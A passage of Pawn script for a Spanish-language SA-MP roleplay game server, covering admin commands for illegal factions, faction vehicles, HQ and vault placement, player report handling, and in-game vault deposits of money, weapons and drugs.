	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "d", facc))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /efaccion [ID Faccion]");
	
	new i = facc-16;
	if(IFacciones[i][If@usada])
	{

		IFacciones[i][If@usada] = 0;
		format(IFacciones[i][If@nombre], 32, "Vacio");
		format(IFacciones[i][If@rango0], 12, "Vacio");
		format(IFacciones[i][If@rango1], 12, "Vacio");
		format(IFacciones[i][If@rango2], 12, "Vacio");
		format(IFacciones[i][If@rango3], 12, "Vacio");
		format(IFacciones[i][If@rango4], 12, "Vacio");
		format(IFacciones[i][If@rango5], 12, "Vacio");
		IFacciones[i][If@boveda] = 0;
		for(new w=0;w<20;w++)
		{
			IFacciones[i][If@armas][w] = 0;
			IFacciones[i][If@drogas][w] = 0;
		}
		IFacciones[i][If@pos][0] = 4000.0;
		IFacciones[i][If@pos][1] = 0.0;
		IFacciones[i][If@pos][1] = 0.0;		
		
		IFacciones[i][If@bpos][0] = 4000.0;
		IFacciones[i][If@bpos][1] = 0.0;
		IFacciones[i][If@bpos][1] = 0.0;
		
		DestroyDynamic3DTextLabel(IFacciones[i][If@3dlabel]);
		DestroyDynamic3DTextLabel(IFacciones[i][If@b3dlabel]);
		
		DestroyDynamicObject(IFacciones[i][If@bpick]);
		DestroyDynamicPickup(IFacciones[i][If@pick]);
		
		GangZoneDestroy(IFacciones[i][If@gang]);
		
		new string[128];
		mysql_format(servidor[mysqlControl], string, sizeof(string), "UPDATE zz_usuarios SET lider=0, miembro=0, rango=0 WHERE miembro=%d;", facc);
		mysql_query(servidor[mysqlControl], string, false);

		ActualizarFaccion(i);
		
		for(new j=0, t=GetMaxPlayers(); j<t; j++)
		{
			if(!cuenta[j][cBusqueda])continue;
			if(cuenta[j][cMiembro] == facc)
			{
				cuenta[j][cRango] = 0;
				cuenta[j][cMiembro] = 0;
				cuenta[j][cLider] = 0;
			}
		}
		Mensaje(playerid, COLOR_BLANCO, "Usted acaba de borrar una faccion ilegal.");
		return 1;
	}
	Mensaje(playerid, COLOR_GRIS2, "Esta faccion no esta creada.");
	return 1;
}
COMMAND:listafaccion(playerid, params[])
{
	new string[42 * sizeof(IFacciones)];
	if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	for(new i=0; i<sizeof(IFacciones); i++)
	{
		if(!IFacciones[i][If@usada]) continue;
		format(string, sizeof(string), "%s\n{ffffff}Nombre: %s - ID: %d", string, IFacciones[i][If@nombre], i+16);
	}
	ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Lista de facciones", string, "Aceptar", "");
	return 1;
}
COMMAND:crearautofacc(playerid, params[])
{
	new model, facc;
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "dd", model, facc))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /crearautofacc [Modelo] [Faccion]");
	for(new i=0; i<sizeof(Autosfacc); i++)
	{
		if(Autosfacc[i][af@modelo] == 607)
		{
			Autosfacc[i][af@modelo] = model;
			Autosfacc[i][af@faccion] = facc;
			GetPlayerPos(playerid, Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2]);
			GetPlayerFacingAngle(playerid, Autosfacc[i][af@Pos][3]);
			DestroyVehicle(Autosfacc[i][af@carid]);
			Autosfacc[i][af@carid] = CreateVehicleEx(Autosfacc[i][af@modelo], Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2], Autosfacc[i][af@Pos][3], Autosfacc[i][af@colores][0], Autosfacc[i][af@colores][1], VEHICULO_SPAWN);
			Mensaje(playerid, COLOR_VERDE, "Este auto fue creado exitosamente.");
			ActualizaAutoFacc(i);
			return 1;
		}
	}
	return 1;
}
COMMAND:editarautofacc(playerid, params[])
{
	new opcion[12], col1, col2, vehicleid = GetPlayerVehicleID(playerid);
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "s[12]D(500)D(500)", opcion, col1, col2))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /editarautofacc [Posicion - Color]");
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(!strcmp(opcion, "posicion"))
		{
			for(new i=0; i<sizeof(Autosfacc); i++)
			{
				if(Autosfacc[i][af@carid] == vehicleid)
				{
					GetPlayerPos(playerid, Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2]);
					GetVehicleZAngle(vehicleid, Autosfacc[i][af@Pos][3]);
					DestroyVehicle(Autosfacc[i][af@carid]);
					Autosfacc[i][af@carid] = CreateVehicleEx(Autosfacc[i][af@modelo], Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2], Autosfacc[i][af@Pos][3], Autosfacc[i][af@colores][0], Autosfacc[i][af@colores][1], VEHICULO_SPAWN);
					PutPlayerInVehicleEx(playerid, Autosfacc[i][af@carid], 0);
					Mensaje(playerid, COLOR_VERDE, "Usted cambio la posicion del vehiculo exitosamente.");
					ActualizaAutoFacc(i);
					return 1;
				}
			}
			Mensaje(playerid, COLOR_ROJO, "Este vehiculo no es editable.");
		}	
		else if(!strcmp(opcion, "color"))
		{
			if(col1 == 500 || col2 == 500)return Mensaje(playerid, COLOR_GRIS2, "Utiliza /editarautofacc [Color][Color 1][Color 2]");
			for(new i=0; i<sizeof(Autosfacc); i++)
			{
				if(Autosfacc[i][af@carid] == vehicleid)
				{
					Autosfacc[i][af@colores][0] = col1;
					Autosfacc[i][af@colores][1] = col2;
					ChangeVehicleColor(vehicleid, Autosfacc[i][af@colores][0], Autosfacc[i][af@colores][1]);
					Mensaje(playerid, COLOR_VERDE, "Usted cambio el color del vehiculo exitosamente.");
					ActualizaAutoFacc(i);
					return 1;
				}
			}
			Mensaje(playerid, COLOR_ROJO, "Este vehiculo no es editable.");
		}
	}
	return 1;
}
COMMAND:borrarautofacc(playerid, params[])
{
	new vehicleid;
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "d", vehicleid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /borrarautofacc [ID Vehiculo]");
	
	for(new i=0; i<sizeof(Autosfacc); i++)
	{
		if(Autosfacc[i][af@carid] == vehicleid)
		{
			Autosfacc[i][af@modelo]		= 607;
			Autosfacc[i][af@faccion]	= 0;
			Autosfacc[i][af@Pos][0]		= 4000.0;
			Autosfacc[i][af@Pos][1]		= 0.0;
			Autosfacc[i][af@Pos][2]		= 0.0;
			Autosfacc[i][af@colores][0] = 0;
			Autosfacc[i][af@colores][0] = 0;
			
			DestroyVehicle(Autosfacc[i][af@carid]);
			Autosfacc[i][af@carid] = CreateVehicleEx(Autosfacc[i][af@modelo], Autosfacc[i][af@Pos][0], Autosfacc[i][af@Pos][1], Autosfacc[i][af@Pos][2], Autosfacc[i][af@Pos][3], Autosfacc[i][af@colores][0], Autosfacc[i][af@colores][1], VEHICULO_SPAWN);
			Mensaje(playerid, COLOR_VERDE, "Este auto fue borrado exitosamente.");
			ActualizaAutoFacc(i);
			return 1;
		}
	}
	Mensaje(playerid, COLOR_ROJO, "Vehiculo no encontrado.");
	return 1;
}
COMMAND:crearfaccion(playerid, params[])
{
	new faccion[32], string[128];
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "s[32]", faccion))return Mensaje(playerid, COLOR_GRIS2, "Use /crearfaccion [Nombre de Faccion]");
	if(strlen(faccion) < 6 || strlen(faccion) > 32)return Mensaje(playerid, COLOR_GRIS2, "Caracteres minimo 6 y maximo 32");
	
	for(new i=0; i<sizeof(IFacciones); i++)
	{
		if(!IFacciones[i][If@usada])
		{
			IFacciones[i][If@usada] = 1;
			IFacciones[i][If@nombre] = faccion;
			IFacciones[i][If@gang] = GangZoneCreate(IFacciones[i][If@pos][0] - 60, IFacciones[i][If@pos][1] - 60, IFacciones[i][If@pos][0] + 60, IFacciones[i][If@pos][1] + 60);

			Mensaje(playerid, COLOR_BLANCO, "Usted acaba de crear una faccion ilegal:");
			format(string, sizeof(string), "ID: %d", i+16);
			Mensaje(playerid, COLOR_BLANCO, string);
			format(string, sizeof(string), "Nombre: %s", IFacciones[i][If@usada]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFaccion(i);
			return 1;
		}
	}
	Mensaje(playerid, COLOR_ROJO, "No se pueden crear mas facciones.");
	return 1;
}
COMMAND:hqboveda(playerid, params[])
{
	new faccid;
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "i", faccid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /hqboveda [ID Faccion]");
	switch(faccid)
	{
		case 16 .. 45:
		{
			if(!IFacciones[faccid - 16][If@usada])return Mensaje(playerid, COLOR_ROJO, "Esta faccion no existe y/o no tiene boveda.");
			DestroyDynamicObject(IFacciones[faccid - 16][If@bpick]);
			DestroyDynamic3DTextLabel(IFacciones[faccid - 16][If@b3dlabel]);
			
			new string[128];
			GetPlayerPos(playerid, IFacciones[faccid - 16][If@bpos][0], IFacciones[faccid - 16][If@bpos][1], IFacciones[faccid - 16][If@bpos][2]);
			format(string, sizeof(string), "Boveda de {008000}%s\n{FFFFFF}Use {868FD9}/boveda", IFacciones[faccid - 16][If@nombre]);
			IFacciones[faccid - 16][If@b3dlabel] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, IFacciones[faccid - 16][If@bpos][0], IFacciones[faccid - 16][If@bpos][1], IFacciones[faccid - 16][If@bpos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
			IFacciones[faccid - 16][If@bpick] = CreateDynamicObject(2332, IFacciones[faccid - 16][If@bpos][0], IFacciones[faccid - 16][If@bpos][1], IFacciones[faccid - 16][If@bpos][2] - 0.5, 0.0, 0.0, 0.0);
			Mensaje(playerid, COLOR_GRIS2, "Esta Boveda fue movida exitosamente.");			
			ActualizarFaccion(faccid - 16);
		}
		default: return Mensaje(playerid, COLOR_GRIS2, "Esta faccion no tiene boveda.");
	}
	return 1;
}

COMMAND:colorid(playerid, params[])
{
	new str[42], icolor;
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "d", icolor))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /colorid [Color ID]");
	if(icolor < 0 || icolor > 136)return Mensaje(playerid, COLOR_GRIS2, "Utiliza /colorid [0 - 136]");
	
	for(new i=icolor; i<icolor+15;i++)
	{
		if(i>136)continue;
		format(str, sizeof(str), "Muestra: |||||||||||||||| Color ID: %d", i);
		Mensaje(playerid, ColorAlpha[i], str);
	}
	return 1;
}
COMMAND:hqmover(playerid, params[])
{
	new faccid;
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "i", faccid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /hqmover [ID Faccion]");
	switch(faccid)
	{
		case 16 .. 45:
		{
			if(!IFacciones[faccid - 16][If@usada])return Mensaje(playerid, COLOR_ROJO, "Esta faccion no tiene territorio ni HQ.");
			DestroyDynamicPickup(IFacciones[faccid - 16][If@pick]);
			DestroyDynamic3DTextLabel(IFacciones[faccid - 16][If@3dlabel]);
			GangZoneDestroy(IFacciones[faccid - 16][If@gang]);
			
			new string[128];
			GetPlayerPos(playerid, IFacciones[faccid - 16][If@pos][0], IFacciones[faccid - 16][If@pos][1], IFacciones[faccid - 16][If@pos][2]);
			format(string, sizeof(string), "{B22222}Territorio de\n{FFFFFF}%s", IFacciones[faccid - 16][If@nombre]);
			IFacciones[faccid - 16][If@3dlabel] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, IFacciones[faccid - 16][If@pos][0], IFacciones[faccid - 16][If@pos][1], IFacciones[faccid - 16][If@pos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
			IFacciones[faccid - 16][If@pick] = CreateDynamicPickup(1314, 1, IFacciones[faccid - 16][If@pos][0], IFacciones[faccid - 16][If@pos][1], IFacciones[faccid - 16][If@pos][2]);
			IFacciones[faccid - 16][If@gang] = GangZoneCreate(IFacciones[faccid - 16][If@pos][0] - 60, IFacciones[faccid - 16][If@pos][1] - 60, IFacciones[faccid - 16][If@pos][0] + 60, IFacciones[faccid - 16][If@pos][1] + 60);
			GangZoneShowForAll(IFacciones[faccid - 16][If@gang], ColorAlpha[IFacciones[faccid - 16][If@color]]);

			Mensaje(playerid, COLOR_GRIS2, "Esta HQ fue movida exitosamente.");
			ActualizarFaccion(faccid - 16);
		}
		default: return Mensaje(playerid, COLOR_GRIS2, "Esta faccion no tiene boveda.");
	}
	return 1;
}
COMMAND:boveda(playerid, params[])
{
	new faccid = cuenta[playerid][cMiembro];
	switch(faccid)
	{
		case 16 .. 45:
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, IFacciones[faccid - 16][If@bpos][0], IFacciones[faccid - 16][If@bpos][1], IFacciones[faccid - 16][If@bpos][2]))
			{
				new str[128], string[(53+24) * 45];
				format(str, sizeof(str), "Sacar Dinero {008000}[%d$]\n", IFacciones[faccid - 16][If@boveda]);
				strcat(string, str);
				for(new w=0; w<20; w++)
				{
					if(IFacciones[faccid - 16][If@armas][w])
					{
						format(str, sizeof(str), "{008000}[*]{FFFFFF} Extraer una %s {008000}[30 Balas]\n", NombreArma(IFacciones[faccid - 16][If@armas][w]));
						strcat(string, str);
					}
					else if(!IFacciones[faccid - 16][If@armas][w])
					{
						strcat(string, "{AA3333}[X]{FFFFFF} Espacio disponible para Armas\n");
					}
				}				
				for(new w=0; w<20; w++)
				{
					if(IFacciones[faccid - 16][If@drogas][w])
					{
						format(str, sizeof(str), "{008000}[*]{FFFFFF} Extraer 30 gramos de {CE726E}%s\n", NombreDroga(IFacciones[faccid - 16][If@drogas][w]));
						strcat(string, str);
					}
					else if(!IFacciones[faccid - 16][If@drogas][w])
					{
						strcat(string, "{AA3333}[X]{FFFFFF} Espacio disponible para Drogas\n");
					}
				}
				ShowPlayerDialog(playerid, DIALOGO_BOVEDA, DIALOG_STYLE_LIST, "{868FD9}Almacen De Faccion", string, "Aceptar", "Salir");
			}else return Mensaje(playerid, COLOR_ROJO, "Usted no esta cerca de la boveda.");
		}
		default: return Mensaje(playerid, COLOR_ROJO, "Usted no puede usar este comando.");
	}
	return 1;
}
COMMAND:zonacolor(playerid, params[])
{
	new facc, icolor;
	if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(sscanf(params, "dd", facc, icolor))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /zonacolor [ID Faccion] [Color ID]");
	if(icolor < 0 || icolor > 136)return Mensaje(playerid, COLOR_GRIS2, "Error ID del color no valida.");
	if(facc < 16 || facc > 45)return Mensaje(playerid, COLOR_GRIS2, "Error ID de faccion no valida.");
	
	IFacciones[facc - 16][If@color] = icolor;
	GangZoneShowForAll(IFacciones[facc - 16][If@gang], ColorAlpha[IFacciones[facc - 16][If@color]]);
	Mensaje(playerid, ColorAlpha[icolor], "Color de la zona, fue cambiado exitosamente.");
	ActualizarFaccion(facc - 16);
	return 1;
}
COMMAND:bguardar(playerid, params[])
{
	new string[312], opcion[12], faccid = cuenta[playerid][cMiembro];
	switch(faccid)
	{
		case 16 .. 45:
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, IFacciones[faccid - 16][If@bpos][0], IFacciones[faccid - 16][If@bpos][1], IFacciones[faccid - 16][If@bpos][2]))
			{
				if(sscanf(params, "s[12]", opcion))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /bguardar [dinero - arma - speed - extasis - ritalin - heroina - marihuana]");
				if(!strcmp(opcion, "dinero"))
				{
					if(obtenerDinero(playerid) < 2000)return Mensaje(playerid, COLOR_GRIS, "Usted necesita 2000$ para guardar.");
					IFacciones[faccid - 16][If@boveda] += 2000;
					pierdeDinero(playerid, 2000);
					
					format(string, sizeof(string), "%s acaba de meter 2000$ en la boveda de su faccion!", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
					SendFamilyMessage(faccid, COLOR_VERDE, string);
					ActualizarFaccion(faccid - 16);
					return 1;
				}
				else if(!strcmp(opcion, "arma"))
				{
					new iarma = GetPlayerWeapon(playerid), ibalas = GetPlayerAmmo(playerid);
					if(!iarma)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener un arma en mano para poder guardarla en la boveda!");
					if(ibalas <= 30)return Mensaje(playerid, COLOR_ROJO, "Se necesitan un minimo de 30 balas para guardar!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@armas][i])
						{
							IFacciones[faccid - 16][If@armas][i] = iarma;
							format(string, sizeof(string), "%s acaba de guardar %s en la boveda de %s.", PlayerName(playerid), GunNames[iarma], IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							darArma(playerid, iarma, -30);
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas armas.");
					return 1;
				}
				else if(!strcmp(opcion, "speed"))
				{
					if(cuenta[playerid][cSpeed] <= 30)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener mas de 30 gramos de speed para guardar en la boveda!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@drogas][i])
						{
							IFacciones[faccid - 16][If@drogas][i] = 1;
							format(string, sizeof(string), "%s acaba de guardar speed en la boveda de %s.", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							cuenta[playerid][cSpeed] -= 30;
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas drogas.");
					return 1;
				}
				else if(!strcmp(opcion, "extasis"))
				{
					if(cuenta[playerid][cExtasis] <= 30)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener mas de 30 gramos de extasis para guardar en la boveda!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@drogas][i])
						{
							IFacciones[faccid - 16][If@drogas][i] = 2;
							format(string, sizeof(string), "%s acaba de guardar extasis en la boveda de %s.", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							cuenta[playerid][cExtasis] -= 30;
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas drogas.");
					return 1;
				}
				else if(!strcmp(opcion, "ritalin"))
				{
					if(cuenta[playerid][cRitalin] <= 30)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener mas de 30 gramos de ritalin para guardar en la boveda!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@drogas][i])
						{
							IFacciones[faccid - 16][If@drogas][i] = 3;
							format(string, sizeof(string), "%s acaba de guardar ritalin en la boveda de %s.", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							cuenta[playerid][cRitalin] -= 30;
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas drogas.");
					return 1;
				}
				else if(!strcmp(opcion, "heroina"))
				{
					if(cuenta[playerid][cHeroina] <= 30)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener mas de 30 gramos de heroina para guardar en la boveda!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@drogas][i])
						{
							IFacciones[faccid - 16][If@drogas][i] = 4;
							format(string, sizeof(string), "%s acaba de guardar heroina en la boveda de %s.", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							cuenta[playerid][cHeroina] -= 30;
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas drogas.");
					return 1;
				}
				else if(!strcmp(opcion, "marihuana"))
				{
					if(cuenta[playerid][cMarihuana] <= 30)return Mensaje(playerid, COLOR_ROJO, "Usted necesita tener mas de 30 gramos de marihuana para guardar en la boveda!");
					for(new i=0; i<20; i++)
					{
						if(!IFacciones[faccid - 16][If@drogas][i])
						{
							IFacciones[faccid - 16][If@drogas][i] = 5;
							format(string, sizeof(string), "%s acaba de guardar marihuana en la boveda de %s.", PlayerName(playerid), IFacciones[faccid - 16][If@nombre]);
							SendFamilyMessage(faccid, COLOR_VERDE, string);
							cuenta[playerid][cMarihuana] -= 30;
							ActualizarFaccion(faccid - 16);
							return 1;
						}
					}
					Mensaje(playerid, COLOR_ROJO, "No hay espacio para meter mas drogas.");
					return 1;
				}
			}else return Mensaje(playerid, COLOR_GRIS2, "Usted no esta cerca de la boveda.");
		}
		default: return Mensaje(playerid, COLOR_ROJO, "Usted no puede usar este comando.");
	}
	return 1;
}

COMMAND:darlider(playerid, params[])
{
	new jugador, idunico, ifaccion[32], string[128];
	if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	
	if(sscanf(params, "ui", jugador, idunico))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darlider [Jugadores] [Facción]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS, "Jugado desconectado.");
	
	switch(idunico)
	{
		case 0: { cuenta[jugador][cTraje] = 299; cuenta[jugador][cRango] = 0; ifaccion = "Ninguna"; }
		case 1: { cuenta[jugador][cTraje] = 283; cuenta[jugador][cRango] = 6; ifaccion = "Policía Local LS"; }
		case 3: { cuenta[jugador][cTraje] = 228; cuenta[jugador][cRango] = 6; ifaccion = "Medical Center LS"; }
		case 4: { cuenta[jugador][cTraje] = 268; cuenta[jugador][cRango] = 6; ifaccion = "Mecanicos LS"; }
		case 5: { cuenta[jugador][cTraje] = 147; cuenta[jugador][cRango] = 6; ifaccion = "Servicios Fort Carson"; }
		case 6: { cuenta[jugador][cTraje] = 295; cuenta[jugador][cRango] = 6; ifaccion = "Gobierno"; }
		case 7: { cuenta[jugador][cRango] = 6; ifaccion = "Radio-Television"; }
		case 9: { cuenta[jugador][cRango] = 6; ifaccion = "FBI"; }
		
		case 16 .. 45:
		{
			if(!IFacciones[idunico - 16][If@usada])return Mensaje(playerid, COLOR_ROJO, "Esa faccion no existe.");
			format(ifaccion, 32, "%s", IFacciones[idunico - 16][If@nombre]);
			cuenta[jugador][cRango] = 6;
		}
		default: return Mensaje(playerid, COLOR_ROJO, "Esa faccion no existe.");
	}
	
	cuenta[jugador][cMiembro] = idunico;
	cuenta[jugador][cLider] = idunico;
	SetPlayerSkin(jugador, cuenta[jugador][cTraje]);
	UpdatePlayerStat(jugador);
	format(string, sizeof(string), "Administrador %s asignó el líder de la facción %s a %s.", PlayerName(playerid), ifaccion, PlayerName(jugador));
	MensajeAmbos(playerid, jugador, 0x6ADFFFFF, string);
	return 1;
}


	command(rr, playerid, params[])
	{
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rr <PlayerID>");
     	if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador no está conectado.");
     	if(booleano[PlayerNeedsHelp]{params[0]})
     	{
      		new string[128];
        	format(string, sizeof(string), "{FFFFFF}AdmWarning: {3F96CB}%s {FFFFFF}ha rechazado el reporte de [ID:%d] {FF0000}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
         	MensajeAdmin(-1, string, 1);
          	format(string, sizeof(string), "{80FF00}*ZZ-RP*: {FFFFFF}Administrador {FF0000}%s [ID:%d] {FFFFFF}ha rechazado su reporte.", PlayerName(playerid), playerid);
           	Mensaje(params[0], -1, string);
            booleano[PlayerNeedsHelp]{params[0]} = false;
        }
        else Mensaje(playerid, COLOR_GRIS, "El jugador no ha enviado ningún reporte.");
		return 1;
    }
    command(ar, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ar <PlayerID>");
        if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador no está conectado.");
		if(booleano[PlayerNeedsHelp]{params[0]})
 		{
   			new string[128];
			format(string, sizeof(string), "{FFFFFF}AdmWarning: {80FF00}%s {FFFFFF}ha aceptado el reporte de [ID:%d] {FF0000}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
			MensajeAdmin(-1, string, 1);
			format(string, sizeof(string), "{80FF00}*ZZ-RP*: {FFFFFF}Administrador {FF0000}%s [ID:%d] {FFFFFF}ha aceptado tu reporte porfavor espere.", PlayerName(playerid), playerid);
			Mensaje(params[0], -1, string);
			booleano[PlayerNeedsHelp]{params[0]} = false;
		}
		else Mensaje(playerid, COLOR_GRIS, "El jugador no ha enviado ningún reporte.");
        return 1;
    }
    command(aduda, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /aduda <id>");
		if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS, "Jugador no está conectado.");
		if(booleano[PlayerDuda]{params[0]}){
		    new string[128];
 	        format(string, sizeof(string), "{FFFFFF}AdmWarning: {B3D972}%s {FFFFFF}aceptó la duda de [ID:%d] {B39CC8}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
		    MensajeAdmin(-1, string, 1);
		    format(string, sizeof(string), "{FFFFFF}* {B39CC8}%s {FFFFFF}le va a responder, para hablar con el administrador Utiliza: /w {B3D972}%d.", PlayerName(playerid), playerid);
		    Mensaje(params[0], -1, string);
		    booleano[PlayerDuda]{params[0]} = false;
		}else Mensaje(playerid, COLOR_GRIS2, "El jugador no ha enviado una duda.");
        return 1;
    }
    command(rduda, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rduda <id>");
		if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS, "Jugador no está conectado.");
		if(booleano[PlayerDuda]{params[0]}){
		    new string[128];
 	        format(string, sizeof(string), "{FFFFFF}AdmWarning: {B3D972}%s {FFFFFF}rechazo la duda de [ID:%d] {B39CC8}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
		    MensajeAdmin(-1, string, 1);
		    format(string, sizeof(string), "{FFFFFF}* {B39CC8}%s {FFFFFF}ha {FF0000}rechazado {FFFFFF}su duda por mal uso de /duda o otra razon conveniente.", PlayerName(playerid), playerid);
		    Mensaje(params[0], -1, string);
		    booleano[PlayerDuda]{params[0]} = false;
		}else Mensaje(playerid, COLOR_GRIS2, "El jugador no ha enviado una duda.");
        return 1;
    }
    command(wtf, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 6)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rduda <id>");
		if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS, "Jugador no está conectado.");
		if(booleano[PlayerDuda]{params[0]}){
		    new string[128];
 	        format(string, sizeof(string), "{FFFFFF}AdmWarning: {B3D972}%s {FFFFFF}wtfqueo la duda de [ID:%d] {B39CC8}%s.", PlayerName(playerid), params[0], PlayerName(params[0]));
		    MensajeAdmin(-1, string, 1);
		    format(string, sizeof(string), "{FFFFFF}* {B39CC8}%s {FFFFFF} ¿What the fuck? Expliquese mejor en el /duda, tiene un minuto para reformularla.", PlayerName(playerid), playerid);
		    Mensaje(params[0], -1, string);
		    booleano[PlayerDuda]{params[0]} = false;
		}else Mensaje(playerid, COLOR_GRIS2, "El jugador no ha enviado una duda.");
        return 1;
    }
	command(comprarhotdog, playerid, params[])
	{
	    if(!IsAtHotdog(playerid))return Mensaje(playerid, COLOR_GRIS2, "  No estas en un lugar adecuado!");
	    if(Hotdog[playerid] >= 5)return Mensaje(playerid, COLOR_GRIS2, "No puedes tener mas de 5 hotdogs!");
	    if(verificarDinero(playerid, 5)){
	        new string[86];
			pierdeDinero(playerid, 5);
            format(string, sizeof(string), "* %s compra un hotdog.", PlayerName(playerid));
  			ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
            Mensaje(playerid, COLOR_BLANCO, "* Has comprado un hotdog, utiliza {FF4564}/chotdog {FFFFFF}para comértelo.");
			Hotdog[playerid] += 1;
		}
	    return 1;
	}
	command(chotdog, playerid, params[])
	{
